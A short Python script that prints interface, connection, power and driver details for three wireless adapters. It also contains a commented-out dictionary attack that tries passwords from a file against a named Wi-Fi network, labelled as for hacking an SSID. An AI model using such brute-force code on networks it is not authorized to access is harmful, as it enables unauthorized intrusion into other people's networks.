from wireless import Wireless

wire1 = Wireless(interface='Wi-Fi')
wire2 = Wireless(interface='wlan1')
wire3 = Wireless(interface='wlan2')
# ssids = input('[+] Enter the wifi ssid to hack')

# with open('password.txt', 'r') as file:
#     for line in file.readlines():
#         if wire.connect(ssid="SWIFT 4G CPE-4BBB", password=line.strip()) == True:
#             print('[+] ' + line.strip() + ' - success!')

#         else:
#             print('[-] ' + line.strip() + ' - failed')

print(wire1.interfaces())
print(wire1.current())
print(wire1.power())
print(wire1.driver())
print(wire2.interfaces())
print(wire2.current())
print(wire2.power())
print(wire2.driver())
print(wire3.interfaces())
print(wire3.current())
print(wire3.power())
print(wire3.driver())
